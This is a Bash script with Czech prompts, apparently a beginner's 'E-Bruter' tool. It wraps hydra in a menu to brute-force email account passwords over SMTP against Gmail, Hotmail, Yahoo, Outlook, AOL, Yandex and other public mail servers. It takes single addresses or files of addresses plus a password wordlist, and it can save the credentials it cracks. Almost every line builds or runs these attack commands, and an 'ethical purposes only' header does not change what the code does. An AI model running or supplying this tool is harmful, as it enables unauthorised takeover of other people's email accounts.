#!/bin/bash
#   <=: INFO :=>
# Author: James Rock
# Facebook: www.facebook.com/Wicked.W0lf
# ! FOR ETHICAL PURPOSES ONLY !
# For absolute beginners

#BARVY

red="\033[1;31m"
green="\033[1;32m"
blue="\033[1;34m"
white="\033[97m"
nc="\e[0m"

#BANNER
clear
echo -e "$nc"
echo -e "$nc"
echo -e "$red	███████╗$nc       $green██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ "
echo -e "$red 	██╔════╝$nc       $green██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗"
echo -e "$red 	█████╗  $nc$blue█████╗$nc $green██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝"
echo -e "$red 	██╔══╝  $nc$blue╚════╝$nc $green██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗"
echo -e "$red 	███████╗$nc       $green██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║"
echo -e "$red	╚══════╝$nc       $green╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝"


#VYBER

echo ""
echo -e "	            $blue <=:Vyber SMTP sluzbu z nabidky:=> $nc"
echo ""
echo -e "$green	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "	    Ξ	  					     Ξ"
echo -e "	    Ξ	$red 1 : Hotmail	4 : Yandex     7 : Aol      $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e	"	    Ξ	$red 2 : Gmail	5 : Mail       8 : Email    $nc$green Ξ"
echo -e "	    Ξ						     Ξ"
echo -e "	    Ξ	$red 3 : Yahoo	6 : Outlook    9 : Post    $nc$green  Ξ"
echo -e "	    Ξ                                                Ξ"
echo -e "	    ΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞΞ"
echo -e "\n $green"
read -e -p " Vyber : " cislo

#AKCE

if [ $cislo = 1 ]; then
  smtp1=smtp.live.com
  echo ""
  read -e -p "[HOTMAIL] [1] Soubor s Emaily / [2] Email : " file
    if [ $file = 1 ]; then
       read -e -p "[HOTMAIL] Zadej cestu k souboru : " soubor
       read -e -p "[HOTMAIL] Zadej cestu k wordlistu : " wordlist
       read -e -p "[HOTMAIL] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[HOTMAIL] Zadej cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp1 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[HOTMAIL] Zadej Email : " email
	   read -e -p "[HOTMAIL] Zadej cestu k wordlistu : " wordlist
	   read -e -p "[HOTMAIL] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[HOTMAIL] Zadej cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp1 smtp
fi
fi

elif [ $cislo = 2 ]; then
  smtp2=smtp.gmail.com
  echo ""
  read -e -p "[GMAIL] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[GMAIL] Zadej cestu k souboru : " soubor
       read -e -p "[GMAIL] Zadej cestu k wordlistu : " wordlist
       read -e -p "[GMAIL] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[GMAIL] Zadej cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp2 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[GMAIL] Zadej Email : " email
	   read -e -p "[GMAIL] Zadej cestu k wordlistu : " wordlist
	   read -e -p "[GMAIL] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[GMAIL] Zadej cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp2 smtp
fi
fi

elif [ $cislo = 3 ]; then
  smtp3=smtp.mail.yahoo.com
  echo ""
  read -e -p "[YAHOO] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[YAHOO] Zadej cestu k souboru : " soubor
       read -e -p "[YAHOO] Zadej cestu k wordlistu : " wordlist
       read -e -p "[YAHOO] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[YAHOO] Zadej cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp3 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[YAHOO] Zadej Email : " email
	   read -e -p "[YAHOO] Zadej cestu k wordlistu : " wordlist
	   read -e -p "[YAHOO] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[YAHOO] Zadej cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp3 smtp
fi
fi

elif [ $cislo = 4 ]; then
  smtp4=smtp.yandex.com
  echo ""
  read -e -p "[YANDEX] [1] File with Emails / [2] Single Email : " file
    if [ $file = 1 ]; then
       read -e -p "[YANDEX] Zadej cestu k souboru : " soubor
       read -e -p "[YANDEX] Zadej cestu k wordlistu : " wordlist
       read -e -p "[YANDEX] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "Y" ]]; then
	   read -e -p "[YANDEX] Zadej cestu k souboru : " output
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	   echo -e "$nc"
	   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp4 smtp
   fi
    elif [ $file = 2 ]; then
	   read -e -p "[YANDEX] Zadej Email : " email
	   read -e -p "[YANDEX] Zadej cestu k wordlistu : " wordlist
	   read -e -p "[YANDEX] Chces ulozit nalezene loginy? [Y/n] : " store
	if [[ $store == "y" || $store == "" ]]; then
	  read -e -p "[YANDEX] Zadej cestu k souboru : " output
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
	elif [[ $store == "n" || $store == "N" ]]; then
	  echo -e "$nc"
	  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp4 smtp
fi
fi

elif [ $cislo = 5 ]; then
  smtp5=smtp.mail.com
  echo ""
read -e -p "[MAIL] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[MAIL] Zadej cestu k souboru : " soubor
     read -e -p "[MAIL] Zadej cestu k wordlistu : " wordlist
     read -e -p "[MAIL] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[MAIL] Zadej cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp5 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[MAIL] Zadej Email : " email
   read -e -p "[MAIL] Zadej cestu k wordlistu : " wordlist
   read -e -p "[MAIL] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[MAIL] Zadej cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp5 smtp
fi
fi

elif [ $cislo = 6 ]; then
  smtp6=smtp-mail.outlook.com
  echo ""
read -e -p "[OUTLOOK] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[OUTLOOK] Zadej cestu k souboru : " soubor
     read -e -p "[OUTLOOK] Zadej cestu k wordlistu : " wordlist
     read -e -p "[OUTLOOK] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[OUTLOOK] Zadej cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp6 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[OUTLOOK] Zadej Email : " email
   read -e -p "[OUTLOOK] Zadej cestu k wordlistu : " wordlist
   read -e -p "[OUTLOOK] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[OUTLOOK] Zadej cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp6 smtp
fi
fi

elif [ $cislo = 7 ]; then
  smtp7=smtp.aol.com
  echo ""
read -e -p "[AOL] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[AOL] Zadej cestu k souboru : " soubor
     read -e -p "[AOL] Zadej cestu k wordlistu : " wordlist
     read -e -p "[AOL] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[AOL] Zadej cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp7 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[AOL] Zadej Email : " email
   read -e -p "[AOL] Zadej cestu k wordlistu : " wordlist
   read -e -p "[AOL] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[AOL] Zadej cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp7 smtp
fi
fi

elif [ $cislo = 8 ]; then
  smtp8=smtp.email.com
  echo ""
read -e -p "[EMAIL] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[EMAIL] Zadej cestu k souboru : " soubor
     read -e -p "[EMAIL] Zadej cestu k wordlistu : " wordlist
     read -e -p "[EMAIL] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[EMAIL] Zadej cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp8 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[EMAIL] Zadej Email : " email
   read -e -p "[EMAIL] Zadej cestu k wordlistu : " wordlist
   read -e -p "[EMAIL] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[EMAIL] Zadej cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp8 smtp
fi
fi

elif [ $cislo = 9 ]; then
  smtp9=smtp.post.com
  echo ""
read -e -p "[POST] [1] File with Emails / [2] Single Email : " file
  if [ $file = 1 ]; then
     read -e -p "[POST] Zadej cestu k souboru : " soubor
     read -e -p "[POST] Zadej cestu k wordlistu : " wordlist
     read -e -p "[POST] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "Y" ]]; then
   read -e -p "[T-MOBILE] Zadej cestu k souboru : " output
   echo -e "$nc"
   hydra -S -c 1 -t 1 -o $output -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
   echo -e "$nc"
   hydra -S -c 1 -t 1 -I -L $soubor -P $wordlist -e s -V -s 465 $smtp9 smtp
 fi
  elif [ $file = 2 ]; then
   read -e -p "[POST] Zadej Email : " email
   read -e -p "[POST] Zadej cestu k wordlistu : " wordlist
   read -e -p "[POST] Chces ulozit nalezene loginy? [Y/n] : " store
if [[ $store == "y" || $store == "" ]]; then
  read -e -p "[POST] Zadej cestu k souboru : " output
  echo -e "$nc"
  hydra -S -c 1 -t 1 -o $output -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
elif [[ $store == "n" || $store == "N" ]]; then
  echo -e "$nc"
  hydra -S -c 1 -t 1 -I -l $email -P $wordlist -e s -V -s 465 $smtp9 smtp
fi
fi
else
 echo -e " \033[7;31m WRONG INPUT! $nc"
exit 1
fi
